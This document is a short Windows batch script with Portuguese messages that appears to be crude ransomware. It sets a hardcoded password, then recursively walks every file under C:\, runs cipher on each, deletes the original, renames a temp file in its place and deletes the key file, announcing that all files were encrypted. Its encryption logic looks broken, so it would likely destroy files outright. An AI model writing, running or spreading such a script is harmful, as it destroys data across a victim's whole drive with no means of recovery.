@echo off
set "senha=3060tkj(GJK%%($*¨(@#LKTG"

set "chave=%TEMP%\chave.txt"
set "tempfile=%TEMP%\tempfile"

echo %senha%> %chave%
set /p hexchave=< %chave%
set hexchave=%hexchave:~0,32%

for /r "C:\" %%f in (*.*) do (
    if not "%%~nxf"=="criptografado.bat" (
        echo Criptografando "%%~nxf"...
        cipher /e /a "%tempfile%" "%%f"
        del "%%f"
        ren "%tempfile%" "%%~nxf"
    )
)

del %chave% %tempfile%
echo Todos os arquivos foram criptografados com sucesso!
pause
